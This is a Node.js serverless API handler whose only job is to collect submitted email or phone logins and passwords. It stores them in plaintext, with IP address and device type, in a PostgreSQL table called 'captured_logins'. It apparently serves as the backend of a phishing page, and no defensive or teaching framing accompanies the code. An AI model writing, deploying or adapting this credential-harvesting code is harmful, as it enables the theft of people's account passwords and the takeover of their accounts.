const { Pool } = require('pg');

console.log('🔧 API Route loaded');
console.log('Database URL exists:', !!process.env.DATABASE_URL);

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

// Test connection on startup
pool.on('connect', () => {
  console.log('✅ Database connected');
});

pool.on('error', (err) => {
  console.error('❌ Database connection error:', err);
});

module.exports = async function handler(req, res) {
  console.log('📥 Received request:', req.method, req.url);
  
  if (req.method !== 'POST') {
    console.log('❌ Method not allowed:', req.method);
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { email, password, userAgent } = req.body;
    console.log('📧 Email received:', email ? email.substring(0, 3) + '***' : 'none');
    
    if (!email || !password) {
      console.log('❌ Missing email or password');
      return res.status(400).json({ error: 'Email and password required' });
    }

    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
    console.log('🌐 IP Address:', ip);

    console.log('🔗 Attempting to connect to database...');
    const client = await pool.connect();
    console.log('✅ Database client acquired');

    // Validate format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\d{10}$/;
    const cleanEmail = email.replace(/\D/g, '');
    const isValidFormat = emailRegex.test(email) || phoneRegex.test(cleanEmail);
    
    const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent || '');
    const deviceType = isMobile ? 'mobile' : 'desktop';

    console.log('📝 Inserting data into database...');
    const result = await client.query(
      `INSERT INTO captured_logins 
       (email, password, user_agent, ip_address, is_valid_format, device_type) 
       VALUES ($1, $2, $3, $4, $5, $6) 
       RETURNING id`,
      [email, password, userAgent, ip, isValidFormat, deviceType]
    );
    
    await client.release();
    
    console.log('✅ Data inserted successfully. ID:', result.rows[0].id);
    
    res.status(200).json({ 
      success: true, 
      message: 'Credentials logged successfully',
      insertedId: result.rows[0].id 
    });
    
  } catch (error) {
    console.error('❌ Fatal error:', error);
    console.error('Error stack:', error.stack);
    
    res.status(500).json({ 
      error: 'Database operation failed',
      details: error.message,
      code: error.code
    });
  }
}
